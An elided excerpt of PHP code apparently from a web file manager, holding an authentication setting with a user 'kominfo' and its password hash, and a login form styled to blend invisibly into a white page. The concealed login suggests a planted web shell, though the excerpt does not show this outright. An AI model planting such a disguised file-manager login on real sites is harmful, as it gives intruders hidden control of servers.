...
$use_auth = true;
$auth_users = array(
    'kominfo' => '$2y$10$H2Dj8TTHvYeu00t/lRNXIus0ezuY9jwZk4Uh0RQJfEwEMWHuGeUQC', 
);
...
<form method="post">
    <div>
                       <input style="margin:0;background-color:white;border:0px;" type="text" class="form-control" id="fm_usr" name="fm_usr" >
    </div>
    <div>
                       <input style="margin:0;background-color:white;border:0px" type="password" class="form-control" id="fm_pwd" name="fm_pwd" >
                       </div>
                       <div class="mb-3">
                                    <div class="mb-3">
                                        <?php fm_show_message(); ?>
...
<head>
    ...
    <style>
        body.fm-login-page{ background-color: white;background-position: top;}
